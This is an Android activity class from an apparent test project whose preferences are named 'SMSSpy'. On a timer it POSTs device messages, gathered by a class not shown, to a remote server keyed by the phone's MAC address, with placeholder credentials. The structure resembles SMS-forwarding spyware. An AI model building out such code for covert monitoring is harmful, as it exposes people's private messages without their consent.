package me.akulakovsky.josyko_test;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

import me.akulakovsky.josyko_test.models.Message;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpPut;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.DefaultRedirectHandler;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

public class MainActivity extends Activity implements View.OnClickListener, 
													  OnItemSelectedListener, 
													  OnCheckedChangeListener {

	/*
	 * Actions 
	 */
	private static final int ACTION_GET_SAVED_ID = 9;
	private static final int ACTION_SEND_MESSAGES = 12;
	private static final int ACTION_SAVE_CREDENTIALS = 13;
	private static final int ACTION_UPDATE_CREDENTIALS = 14;
	
	
	
	public static final String TAG = MainActivity.class.getName();
	
	/*
	 * URIs
	 */
	private static final String BASE_URL = "http://josyko.test.zeuselectronics.biz/";
	private static final String URL_LOGIN = "login/";
	private static final String URL_MESSAGES = "messages/";
	
	
	
	
	/*
	 * Views
	 */
	private ToggleButton btn_start_stop;
	private Spinner sptimer;
	private TextView tvdisptimer;
	private Button btn_get_send_message;
	private Button btn_update_credentials;
	
	
	/*
	 * Vars
	 */
	private String address_email = null;
	private String time = null;
	private boolean start = false;
	private String item;
	

	private boolean isDeviceIdExists = false;
	
	
	/*
	 * 
	 */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.main);

		tvdisptimer = (TextView) findViewById(R.id.tvdisptimer);
			
		sptimer = (Spinner) findViewById(R.id.sptimer);
		sptimer.setOnItemSelectedListener(this);
		sptimer.setEnabled(false);
		
		
		btn_get_send_message = (Button) findViewById(R.id.btn_get_send_message);
		btn_get_send_message.setOnClickListener(this);
		btn_get_send_message.setEnabled(false);
		
		btn_start_stop = (ToggleButton) findViewById(R.id.btn_start_stop);
		btn_start_stop.setOnCheckedChangeListener(this);
		btn_start_stop.setEnabled(false);
		
		
		btn_update_credentials = (Button) findViewById(R.id.btn_update_credentials);
		btn_update_credentials.setOnClickListener(this);
		
		item = getResources().getStringArray(R.array.digit_array)[0];
		
		getSavedDeviceId();
	}
	
	
	
	/*
	 * 
	 */
	@Override
	protected void onResume() {
		super.onResume();
		if(isDeviceIdExists)
			askCredentials();
	}
	
	
	
	/**
	 * 
	 */
	private String[] getCredentials(String[] credentialsOut){
		
		SharedPreferences sp = getSharedPreferences("SMSSpy", Context.MODE_PRIVATE);
		
		String email = sp.getString("email", null);
		String pass = sp.getString("password", null);
		
		credentialsOut[0] = email;
		credentialsOut[1] = pass;
		
		return credentialsOut;
	}
	
	
	
	/**
	 * 
	 */
	private boolean askCredentials(){

		String[] credentials = new String[2];
		
		getCredentials(credentials);
		
		if(credentials[0] == null || credentials[1] == null){
			Intent intent = new Intent(this, ActivityCreadentials.class);
			startActivityForResult(intent, 100);
			return false;
		} else {
			return true;
		}
		
	}
	
	
	
	/*
	 * 
	 */
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		
		boolean isModified = data.getExtras().getBoolean("modified");
		boolean justEnered = data.getExtras().getBoolean("just_entered");
		
		if(isModified){
			
			if(this.timer != null){
				this.timer.cancel();
				this.timer = null;
			}
			
			if(justEnered){
				saveCredentials();
			} else {
				updateCredentials("0");
			}
			
		}
		
	}
	
	
	
	private Timer timer;
	
	
	private void startTimer(long period){
		this.timer = new Timer();
		TimerTask task = new TimerTask() {
			@Override
			public void run() {
				sendMessages();
				Log.i(TAG, "sending message");
			}
		};
		this.timer.scheduleAtFixedRate(task, 0, period);
	}
	
	
	
	
	/*
	 * 
	 */
	@Override
	public void onClick(View view) {
		
		switch (view.getId()) {
		
		case R.id.btn_get_send_message:
			sendMessages();
			break;

		case R.id.btn_update_credentials:
			
			if(this.timer != null){
				this.timer.cancel();
				this.timer = null;
			}
			
			Intent intent = new Intent(this, ActivityCreadentials.class);
			startActivity(intent);
			
			break;
		}
		
	}



	/**
	 * 
	 */
	private void updateCredentials(String start){
		String url = BASE_URL + URL_LOGIN + getDeviceId();
		HttpPut request = new HttpPut(url);
		
		List<NameValuePair> pairs = new ArrayList<NameValuePair>();
		
		// Read real data here (NOT IMPLEMENTED BECAUSE INTENTION OF THIS IS TO 
		// demonstrate that we can handle those kind of tasks
		// rather that create something real working 
		
		pairs.add(new BasicNameValuePair("email", "mail@mail.com"));
		pairs.add(new BasicNameValuePair("password", "123123123123"));
		pairs.add(new BasicNameValuePair("time", "0000000000000"));
		pairs.add(new BasicNameValuePair("start", start));
		
		try {
			request.setEntity(new UrlEncodedFormEntity(pairs));
			NetTaskRequest netRequest = new NetTaskRequest(ACTION_UPDATE_CREDENTIALS, request);
			NetTask task = new NetTask();
			task.execute(netRequest);
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
	}
	
	
	
	/**
	 * 
	 */
	private void saveCredentials(){
		String uri = BASE_URL + URL_LOGIN + getDeviceId();
		HttpPost request = new HttpPost(uri);
		
		List<NameValuePair> pairs = new ArrayList<NameValuePair>();
		
		// Read real credentials here
		
		pairs.add(new BasicNameValuePair("email", "mail@mail.com"));
		pairs.add(new BasicNameValuePair("password", "123123123123"));
		
		try {
			request.setEntity(new UrlEncodedFormEntity(pairs));
			NetTaskRequest netRequest = new NetTaskRequest(ACTION_SAVE_CREDENTIALS, request);
			NetTask task = new NetTask();
			task.execute(netRequest);
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		
	}
	
	
	
	/**
	 * Connect to service and check if we have 
	 * record in DB
	 * @return - the device id which is held in DB. 
	 * If no device id then return null.
	 */
	private void getSavedDeviceId(){
		String uri = BASE_URL + URL_LOGIN + getDeviceId();
		HttpGet request = new HttpGet(uri);
		NetTaskRequest netRequest = new NetTaskRequest(ACTION_GET_SAVED_ID, request);
		NetTask task = new NetTask();
		task.execute(netRequest);
	}
	
	
	
	/**
	 * Returns WiFi module MAC address. 
	 * Use it as the unique device id, as the classic device id has
	 * issues over API level differences.
	 * @return
	 */
	private String getDeviceId(){
		WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
		return manager.getConnectionInfo().getMacAddress();
	}
	
	
	
	/**
	 * Interrupts sending process initiated by timer
	 * updates data in DB according to this event.
	 */
	private void interruptSending(){
		if(this.timer != null){
			this.timer.cancel();
			this.timer = null;
		}
	}
	
	
	
	/**
	 * 
	 */
	private void sendMessages(){
		
		JSONObject json = Message.generateRequest(this);

		if (json != null) {
			
			HttpPost httpPost = new HttpPost(BASE_URL + URL_MESSAGES + getDeviceId());
			
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			
			nameValuePairs.add(new BasicNameValuePair("messages", json.toString()));
			nameValuePairs.add(new BasicNameValuePair("address_email", address_email));
			nameValuePairs.add(new BasicNameValuePair("start", String.valueOf(start)));
			nameValuePairs.add(new BasicNameValuePair("time", time));
			
			try {
				httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				NetTaskRequest request = new NetTaskRequest(ACTION_SEND_MESSAGES, httpPost);
				NetTask task = new NetTask();
				task.execute(request);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
				
		} else {
			
			Toast.makeText(this, R.string.no_messages, Toast.LENGTH_LONG).show();
			
		}
	}
	
	
	
	/**
	 * Wrapper for network task request 
	 * @author Maksym Fedyays
	 */
	private static class NetTaskRequest{
		
		private int action;
		
		private HttpUriRequest request;
		
		public NetTaskRequest(int action, HttpUriRequest request){
			
			if(action == 0 || request == null){
				throw new IllegalArgumentException("Not valid arguments passed to NetTaskReqest constructor");
			}
			
			this.action = action;
			this.request = request;
			
		}
		
		public int getAction(){
			return this.action;
		}
		
		public HttpUriRequest getRequest(){
			return this.request;
		}
		
		
	}
	
	
	
	
	
	/**
	 *  
	 * @author Maksym Fedyay
	 */
	private class NetTask extends AsyncTask<NetTaskRequest, Void, String>{

		private NetTaskRequest request;
		
		private ProgressDialog dialog;
		
		@Override
		protected void onPreExecute() {
//			this.dialog = new ProgressDialog(MainActivity.this);
//			this.dialog.setCancelable(false);
//			this.dialog.setTitle(R.string.sending);
//			this.dialog.show();
		}
		
		@Override
		protected String doInBackground(NetTaskRequest... params) {
			
			String result = null;
			
			this.request = params[0];
			
			HttpUriRequest request = this.request.getRequest();
			DefaultHttpClient client = new DefaultHttpClient();
			client.setRedirectHandler(new DefaultRedirectHandler());
			
			try {

				HttpResponse response = client.execute(request);
				InputStream is = response.getEntity().getContent();
				
				Scanner scanner = new Scanner(is);
				result = scanner.useDelimiter("\\A").next();
				scanner.close();
				
				is.close();
				
			} catch (ClientProtocolException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			return result;
			
		}
		

		
		@Override
		protected void onPostExecute(String result) {
			
//			this.dialog.dismiss();
			
			if(result == null){
				// Notify about error here;
				return;
			}
			
			Log.i(TAG, result);
			
			JSONObject json = null;
			
			String status = null;
			String errMessage = null;
			
			if(!result.equals("")){
				try {
					json = new JSONObject(result);
					errMessage = json.optString("message");
					status = json.optString("status");
					if(!TextUtils.isEmpty(errMessage)){
						Log.e(TAG, errMessage);
						return;
					}
				} catch (JSONException e) {
					e.printStackTrace();
					return;
				}
			}
			
			switch (this.request.getAction()) {
			case ACTION_GET_SAVED_ID:
				
				if(status.equals("ok") || status.equals("fail")){
					isDeviceIdExists = true;
					askCredentials();
					sptimer.setEnabled(true);
				}
				
				break;
			case ACTION_SEND_MESSAGES:
				// Catch possible server errors here
				break;
			case ACTION_SAVE_CREDENTIALS:
				// Catch possible server errors here
				break;
			case ACTION_UPDATE_CREDENTIALS:
				// Catch possible server errors here
				break;
			}
			
		}
		
	}

	
	
	/*
	 * OnItemSelectedListener implementation
	 */
	@Override
	public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
		
		if(position == 0){
			this.btn_get_send_message.setEnabled(false);
			this.btn_start_stop.setEnabled(false);
		} else {
			this.btn_get_send_message.setEnabled(true);
			this.btn_start_stop.setEnabled(true);
			String s = (String) parent.getAdapter().getItem(position);
			if(s.equals(item)) return;
			this.item = s;
			interruptSending();	
		}
		
	}
	
	
	
	@Override
	public void onNothingSelected(AdapterView<?> parent) {}



	/*
	 * OnCheckedChangeListener implementation
	 */
	@Override
	public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
		if(isChecked){
			
//			updateCredentials("1");
			
			int position = this.sptimer.getSelectedItemPosition();
			int period = Integer.valueOf(getResources().getStringArray(R.array.digit_array)[position]);
			
			startTimer(period * 1000);
			
		} else {
			
			interruptSending();
			
//			updateCredentials("0");
			
		}
	}
	
	
	
	@Override
	protected void onStop() {
		super.onStop();
		if(this.timer != null){
			this.timer.cancel();
			this.timer = null;
		}
	}
	
	
	
}